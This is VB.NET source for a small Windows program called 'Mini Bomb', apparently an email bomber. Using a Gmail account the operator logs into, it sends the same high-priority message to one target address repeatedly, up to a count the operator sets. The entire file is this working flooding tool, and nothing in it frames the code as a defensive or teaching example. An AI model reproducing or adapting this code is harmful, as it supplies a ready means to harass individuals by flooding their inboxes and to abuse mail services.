Imports System.Net.Mail
Public Class Form1
    Dim i As Integer = 0
    Private Sub AboutToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AboutToolStripMenuItem.Click
        MessageBox.Show("By Nathan72389" & vbNewLine & "Http://www.natespages.ucoz.com", "Mini Bomb", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub

    Private Sub FileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FileToolStripMenuItem.Click
        Me.Close()
    End Sub

    Private Sub StartToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartToolStripMenuItem.Click
        GroupBox2.Enabled = False
        GroupBox1.Enabled = False
        StartToolStripMenuItem.Enabled = False
        stopbtn.Enabled = True
        BackgroundWorker1.RunWorkerAsync()
    End Sub

    Private Sub done() Handles BackgroundWorker1.RunWorkerCompleted
        stopbtn.Enabled = False
        StartToolStripMenuItem.Enabled = True
        GroupBox2.Enabled = True
        GroupBox1.Enabled = True
        i = 0
    End Sub

    Private Sub StopToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles stopbtn.Click
        BackgroundWorker1.CancelAsync()
    End Sub

    Private Sub BackgroundWorker1_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Dim MyMailMessage1 As New MailMessage()
        MyMailMessage1.From = New MailAddress(TextBox2.Text)
        MyMailMessage1.To.Add(TextBox4.Text)
        MyMailMessage1.Subject = (TextBox5.Text)
        MyMailMessage1.Body = TextBox1.Text
        MyMailMessage1.Priority = MailPriority.High
        Dim SMTPServer As New SmtpClient("smtp.gmail.com")
        SMTPServer.Port = 587
        SMTPServer.Credentials = New System.Net.NetworkCredential(TextBox2.Text, TextBox3.Text)
        SMTPServer.EnableSsl = True
        Do Until i = NumericUpDown1.Value
            If BackgroundWorker1.CancellationPending Then
                Exit Sub
            End If
            SMTPServer.Send(MyMailMessage1)
            i = i + 1
        Loop
    End Sub
End Class
